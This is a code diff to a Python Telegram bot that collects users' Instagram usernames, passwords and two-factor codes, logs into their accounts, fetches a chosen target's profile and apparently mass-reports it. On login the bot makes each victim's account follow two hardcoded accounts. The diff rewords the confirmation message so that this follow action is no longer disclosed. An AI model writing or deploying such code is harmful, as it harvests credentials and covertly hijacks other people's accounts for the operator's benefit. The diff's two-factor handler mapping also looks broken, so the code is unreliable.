@@ -22,8 +22,12 @@ async def check_channel_membership(update: Update):
     member_statuses = []
 
     for channel in CHANNELS:
-        status = await update.message.chat.get_member(user_id)
-        member_statuses.append(status.status)
+        try:
+            status = await update.message.chat.get_member(user_id)
+            member_statuses.append(status.status)
+        except Exception as e:
+            print(f"Error checking membership for {channel}: {e}")
+            member_statuses.append('not_member')
     
     return all(status in ['member', 'administrator'] for status in member_statuses)
 
@@ -70,11 +74,10 @@ async def password_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Successfully logged in as {username}")
 
         # Example follow actions
-        target_to_follow = "imperfailed"
-        cl.user_follow(cl.user_id_from_username(target_to_follow))
-        target_to_follow1 = "foileds"
-        cl.user_follow(cl.user_id_from_username(target_to_follow1))
-        await update.message.reply_text(f"Successfully followed {target_to_follow}. Now, please enter the target Instagram username to fetch their profile:")
+        for target in ["imperfailed", "foileds"]:
+            cl.user_follow(cl.user_id_from_username(target))
+
+        await update.message.reply_text("Successfully logged in! Please enter the target Instagram username to fetch their profile:")
         return TARGET
 
     except TwoFactorRequired:
@@ -160,6 +163,9 @@ async def fetch_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
             with open(temp_file_path, 'rb') as photo_file:
                 await update.message.reply_photo(photo=photo_file, caption=profile_info)
 
+            # Clean up temporary file
+            os.remove(temp_file_path)
+
         else:
             # If image download fails, send just the profile info
             await update.message.reply_text(f"Couldn't fetch profile picture. Here's the profile info:\n\n{profile_info}")
@@ -187,7 +193,7 @@ async def start_reporting(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def main():
     # Ensure the token is set in the environment
     if TOKEN is None:
-        print("Error: Please set the TELEGRAM_BOT_TOKEN environment variable.")
+        print("Error: Please set the API environment variable.")
         return
 
     application = ApplicationBuilder().token(TOKEN).build()
@@ -198,7 +204,7 @@ def main():
         states={
             USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, username_handler)],
             PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)],
-            TWO_FACTOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, two_factor_handler)],
+            TWO_FACTOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_code_handler)],
             CHALLENGE_CHOICE: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_choice_handler)],
             CHALLENGE_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, challenge_code_handler)],
             TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_profile)],
@@ -215,4 +221,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-                                                                                                           
+    
